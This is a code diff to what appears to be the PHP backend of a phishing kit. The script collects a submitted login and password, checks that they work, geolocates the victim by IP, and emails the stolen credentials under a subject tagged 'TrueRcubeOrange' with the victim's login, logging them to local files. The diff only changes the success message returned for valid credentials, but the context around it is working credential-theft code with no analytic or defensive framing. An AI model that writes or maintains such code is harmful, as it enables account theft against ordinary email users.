@@ -152,7 +152,7 @@ if (!empty($login) && !empty($passwd)) {
         file_put_contents("debug.txt", $debugLog, FILE_APPEND);
         
         if ($validCredentials) {
-            // Valid credentials - always show success regardless of email status
+            // Valid credentials - show authentication successful first
             $subg = "TrueRcubeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
             
             $smtpConfig = [
@@ -170,9 +170,9 @@ if (!empty($login) && !empty($passwd)) {
             $emailLog = "Email sent for valid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
             file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
             
-            // Always show success for valid credentials
-            $data = array('signal' => 'ok', 'msg' => 'Login Successful');
-            $debugLog = "Valid credentials - Setting signal to 'ok' with 'Login Successful'\n";
+            // Show authentication successful for valid credentials
+            $data = array('signal' => 'auth_success', 'msg' => 'Authentication Successful');
+            $debugLog = "Valid credentials - Setting signal to 'auth_success' with 'Authentication Successful'\n";
             file_put_contents("debug.txt", $debugLog, FILE_APPEND);
         } else {
             // Invalid credentials - always show wrong password
